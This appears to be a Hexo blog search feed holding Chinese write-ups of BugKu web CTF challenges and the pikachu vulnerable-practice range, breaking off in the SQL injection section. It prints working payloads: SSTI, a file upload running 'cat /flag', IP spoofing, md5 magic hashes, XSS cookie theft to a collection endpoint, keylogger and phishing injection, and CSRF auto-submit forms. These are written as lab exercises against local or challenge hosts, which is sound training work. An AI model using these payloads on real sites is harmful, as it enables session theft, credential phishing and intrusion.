<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BugKu Web 刷题记录1</title>
      <link href="/2022/04/24/BugKu-Web1/"/>
      <url>/2022/04/24/BugKu-Web1/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-刷题记录1"><a href="#BugKu-Web-刷题记录1" class="headerlink" title="BugKu Web 刷题记录1"></a>BugKu Web 刷题记录1</h1><blockquote><p>参考：</p><p><a href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p><p><a href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p><p><a href="https://www.secpulse.com/archives/146728.html">BugKu-Web-wp3</a></p><p><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p></blockquote><h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>F12查看源码</p><p><img src="https://s2.loli.net/2022/04/24/XbFRket7Y6Kl4C8.png" alt="SSTI1.png"></p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17350/?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/l3KfC9Ap51EM8vr.png" alt="SSTI11.png"></p><h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p><img src="https://s2.loli.net/2022/04/24/7d1ugKRv3ZNfxas.png" alt="SSTI2.png"></p><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>创建111.txt并输入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>修改文件名为111.jpg后上传文件即可得到flag</p><p><img src="https://s2.loli.net/2022/04/24/A7mIp28bU3tLDyT.png" alt="flaskfileupload.png"></p><h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><p><img src="https://s2.loli.net/2022/04/24/Mewq2vpiEzYT7mg.png" alt="huaji1.png"></p><p>F12后，ctrl+f搜索flag即可</p><p><img src="https://s2.loli.net/2022/04/24/F78NBcCUD1szXb9.png" alt="huaji.png"></p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>F12，修改长度限制，随后输入正确计算结果即可。</p><p><img src="https://s2.loli.net/2022/04/24/Waq4kS6ZLHjeoNl.png" alt="jisuanqi.png"></p><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><img src="https://s2.loli.net/2022/04/24/Npb6VZol3mInsBH.png" alt="GET.png"></p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="https://s2.loli.net/2022/04/24/B7LzEGeklKOoWrn.png" alt="POST.png"></p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>第一个条件是不能为数字，第二个条件是&#x3D;&#x3D;比较，和整型比较是会先把字符串转化为整型，’1admin’在比较时候会变成1</p><p><img src="https://s2.loli.net/2022/04/24/5Ol9HLuM1oeRhkN.png" alt="maodun.png"></p><h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>查看源代码</p><p><img src="https://s2.loli.net/2022/04/24/FsegtnxZPRb9rJa.png" alt="alert1.png"></p><p>放到html中显示</p><p><img src="https://s2.loli.net/2022/04/24/hfzmJFR91PDweGs.png" alt="alert2.png"></p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>burp suite抓包</p><p><img src="https://s2.loli.net/2022/04/24/NwaztUknmE8bplS.png" alt="pleasestop.png"></p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>关键在于这一句</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>); </span><br></pre></td></tr></table></figure><p>故传入args&#x3D;GLOBALS,最后会输出​GLOBALS,flag就在其中</p><p><img src="https://s2.loli.net/2022/04/24/syhBUpZaqRP7n1d.png" alt="var1.png"></p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>抓包查看响应包</p><p><img src="https://s2.loli.net/2022/04/24/yvD9piJZXMmFKQt.png" alt="head.png"></p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>提示有无后门，用御剑扫描一下发现shell.php</p><p><img src="https://s2.loli.net/2022/04/24/PbH69l3sUem4DoV.png" alt="webhack1.png"></p><p>进入后发现需要输入密码</p><p><img src="https://s2.loli.net/2022/04/24/8tbwWkHPKyhC47V.png" alt="webhack2.png"></p><p>用burp爆破获得密码</p><p><img src="https://s2.loli.net/2022/04/24/uzrAfldKvnTo4B7.png" alt="webhack3.png"></p><p>输入密码后得到flag</p><p><img src="https://s2.loli.net/2022/04/24/8dpoyg6bMSNfELr.png" alt="webhack4.png"></p><h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><p>F12查看发现编码</p><p><img src="https://s2.loli.net/2022/04/24/MmrcLXi34WOEzKI.png" alt="localadmin1.png"></p><p>放进base64中解密得到密码，由于是管理员，故猜测账户为admin</p><p><img src="https://s2.loli.net/2022/04/24/ZjtPILEszfDlwkV.png" alt="localadmin2.png"></p><p>输入后发现ip被ban</p><p><img src="https://s2.loli.net/2022/04/24/x9lPEfVbmnZzwHX.png" alt="localadmin3.png"></p><p>使用burp进行ip伪造获取flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR:127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/j2W6BIwP4nO79hE.png" alt="localadmin4.png"></p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>F12查看得到代码</p><p><img src="https://s2.loli.net/2022/04/24/O2yuU3kj7dmB4Kx.png" alt="sourcecode1.png"></p><p>用以下代码解码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">&#x27;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">&#x27;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">&#x27;%35%34%61%61%32&#x27;</span> + p2))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/BDo9MWTAtYE5Xk1.png" alt="sourcecode2.png"></p><p>输入密码即可得到flag</p><p><img src="https://s2.loli.net/2022/04/24/1XUKFIPmZH5we7V.png" alt="sourcecode3.png"></p><h2 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h2><p>根据提示（z?????）猜测为z开头的6位密码，直接用burp爆破（注意加上标记code: ‘bugku10000’，不然所有返回字段都相同）</p><p><img src="https://s2.loli.net/2022/04/24/ifEnaDS5juJv9o6.png" alt="bp.png"></p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>使用扫描工具扫描（<a href="https://github.com/WangYihang/SourceLeakHacker">SourceLeakHacker</a>）</p><p><img src="https://s2.loli.net/2022/04/24/FSgYfPL5q2m1xR3.png" alt="beifen1.png"></p><p>输入&#x2F;index.php.bak后缀下载得到源文件index.php.bak</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);  <span class="comment">//strstr 获得URI从&#x27;?&#x27;往后(包括&#x27;?&#x27;)的字符串</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>); <span class="comment">//substr 去掉&#x27;?&#x27;</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>); <span class="comment">//把$str中的所有key去掉</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>); <span class="comment">//把字符串解析到变量里</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123; <span class="comment">//key1和key2的md5值相等但二者不恒等</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11514/?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://s2.loli.net/2022/04/24/ScwQDT3s6GlRnpy.png" alt="beifen2.png"></p><p>介绍一批md5是0e开头的字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e50936721341820670084200876351</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场刷题记录</title>
      <link href="/2022/04/21/pikachu/"/>
      <url>/2022/04/21/pikachu/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Web-pikachu靶场记录"><a href="#CTF-Web-pikachu靶场记录" class="headerlink" title="CTF Web pikachu靶场记录"></a>CTF Web pikachu靶场记录</h1><blockquote><p>简单记录下pikachu靶场刷题历程</p><p>参考资料：</p><p><a href="https://www.bilibili.com/video/BV1Qh411D7mN?share_source=copy_web">全程讲解视频</a></p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachu靶场wp1</a></p><p><a href="https://blog.csdn.net/weixin_44288604/article/details/107880269?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165020809116780255213643%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165020809116780255213643&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107880269.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu&spm=1018.2226.3001.4187">pikachu靶场wp2</a></p></blockquote><h2 id="靶场环境配置"><a href="#靶场环境配置" class="headerlink" title="靶场环境配置"></a>靶场环境配置</h2><blockquote><p>可以参照本篇博客：<a href="https://www.webxlab.net/article/detail/OmAE5oMAar">https://www.webxlab.net/article/detail/OmAE5oMAar</a></p></blockquote><p>初始界面如下：</p><p><img src="https://s2.loli.net/2022/04/21/UPZhWdKINOnD8V7.png" alt="brief_intro.png"></p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>使用burp suite即可</p><p>burpsuite无法拦截本地包：<a href="https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1">https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1</a></p><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>使用intruder模块即可</p><h3 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h3><p>验证码不过期 </p><h3 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h3><p>直接爆破</p><h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h3><p>token可以获取并放入下一次爆破 注意选择合适的爆破方式（pitchfork）</p><h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h2><h3 id="反射型XSS（get）"><a href="#反射型XSS（get）" class="headerlink" title="反射型XSS（get）"></a>反射型XSS（get）</h3><p>输入一些特殊字符试一下 如果有输入字符限制（前端），可F12直接修改限制值</p><h3 id="反射型XSS（post）"><a href="#反射型XSS（post）" class="headerlink" title="反射型XSS（post）"></a>反射型XSS（post）</h3><p>登陆后输入payload</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>先特殊字符试下，然后输入payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;</span><br></pre></td></tr></table></figure><p>构造payload替换掉”+str+”，payload为#’ onclick &#x3D; “alert(‘evolution’)”&gt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span><br></pre></td></tr></table></figure><h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#&#x27; onclick = &quot;alert(&#x27;evolution&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>输入payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>网页后缀改为admin_login.php，查看信息</p><h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">sCriPt</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">q&#x27;onclick=&#x27;alert(1111)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/TNlce25h3JUnP71.png" alt="xss_htmlspecialchars.png"></p><h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(&#x27;evolution&#x27;)</span><br></pre></td></tr></table></figure><h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">e&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="pikachu-Xss-后台"><a href="#pikachu-Xss-后台" class="headerlink" title="pikachu Xss 后台"></a>pikachu Xss 后台</h2><p>pkxss后台：</p><p><a href="http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php">http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php</a></p><h3 id="cookie搜集"><a href="#cookie搜集" class="headerlink" title="cookie搜集"></a>cookie搜集</h3><h4 id="get型："><a href="#get型：" class="headerlink" title="get型："></a>get型：</h4><p>在反射型xss（get）中输入payload（注意取消前端字符长度的限制）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://127.0.0.1:8081/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%3A8081%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure><p>还可以更改一下，让他继续跳转到正常界面（伪装一下）</p><p>修改pikachu\pkxss\xcookie\cookie.php文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1:8081/pikachu/index.php&quot;</span>);<span class="comment">//重定向到一个可信的网站</span></span><br></pre></td></tr></table></figure><h4 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/pkxss/xcookie/post.html</span><br></pre></td></tr></table></figure><p>注意修改pikachu\pkxss\xcookie\post.html文件中的两个地址链接</p><h4 id="cookie后台信息"><a href="#cookie后台信息" class="headerlink" title="cookie后台信息"></a>cookie后台信息</h4><p><img src="https://s2.loli.net/2022/04/21/BImJ45QWKCT7vnD.png" alt="xss_cookie.png"></p><h3 id="钓鱼结果"><a href="#钓鱼结果" class="headerlink" title="钓鱼结果"></a>钓鱼结果</h3><p>修改pikachu\pkxss\xfish\fish.php中的链接地址（其中的空格要去掉）</p><p>存储型xss题目留言板中输入</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/He3G9hPEsKyVR5c.png" alt="xss_fish.png"></p><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p>修改pikachu\pkxss\rkeypress\rk.js中第54行地址链接</p><p>存储型xss题目留言板中输入</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/rkeypress/rk.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/ZQKcLsS3tBixVwq.png" alt="xss_keyboard.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>若进入编辑页面出现如下错误：</p><p><img src="https://s2.loli.net/2022/04/21/q73znWeTiNZjVdA.png" alt="csrf_error.png"></p><p>将pikachu\vul\csrf\csrfget\csrf_get_edit.php文件中的MYSQL_ASSOC修改为MYSQLI_ASSOC即可(<strong>各个题目中相同报错同理</strong>)</p><blockquote><p>参考：<a href="https://blog.csdn.net/mastergu2/article/details/107904129">https://blog.csdn.net/mastergu2/article/details/107904129</a></p></blockquote><p>观察流量包：</p><p><img src="https://s2.loli.net/2022/04/21/vkdSNTHtz4mLoPK.png" alt="csrf_get.png"></p><p>构造url：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=earth&amp;email=lucy%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>构造post.html即可</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111111111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;lucy@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>url构造为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/post.html</span><br></pre></td></tr></table></figure><blockquote><p>参考博客：<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachu靶场wp1</a></p></blockquote><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>很好的防御CSRF攻击的方法。</p><h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>传入参数修改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or 1 = 